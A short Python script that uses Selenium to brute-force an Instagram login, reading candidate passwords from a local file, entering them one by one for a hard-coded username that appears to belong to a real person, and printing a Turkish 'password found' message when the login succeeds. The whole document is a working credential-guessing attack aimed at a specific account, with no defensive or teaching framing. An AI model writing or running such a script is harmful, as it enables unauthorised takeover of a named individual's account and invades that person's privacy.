import requests
import time
import json
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
import os

passwords = open("parola.txt", "r")

for p in passwords:
    var_path = os.getcwd()
    driver = webdriver.Chrome(var_path + '/chromedriver')
    driver.delete_all_cookies()
    action_chains = ActionChains(driver)
    driver.get("https://bit.ly/3gyhH5c")
    driver.implicitly_wait(5)
    usernameInput = driver.find_element_by_name("username")
    action_chains.move_to_element(usernameInput)
    usernameInput.send_keys("nazmiye_naz_1982")
    passwordInput = driver.find_element_by_name("password")
    action_chains.move_to_element(passwordInput)
    passwordInput.send_keys(p)
    passwordInput.send_keys(Keys.ENTER)
    driver.implicitly_wait(5)
    time.sleep(3)
    if driver.current_url == 'https://www.instagram.com/':
        print("Şifre bulundu! =>" + p)
        control = True
    time.sleep(5)

